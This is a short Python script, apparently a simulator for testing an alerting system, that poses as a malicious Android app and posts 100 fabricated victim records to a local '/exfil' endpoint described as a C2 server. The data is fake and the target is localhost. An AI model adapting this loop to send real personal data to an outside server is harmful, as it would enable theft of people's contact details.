import requests
import time
import random
import threading

print("🤖 FAKE MALICIOUS ANDROID APP")
print("=" * 50)

def attack():
    for i in range(100):  # 100 exfiltrations = HIGH alert
        data = {"name": f"Victim_{i}", "phone": f"999{i}", "stolen": True}
        try:
            requests.post("http://127.0.0.1:5000/exfil", json=data)
            print(f"📱 EXFIL: Victim_{i} → C2 Server")
        except:
            pass
        time.sleep(0.3)

attack()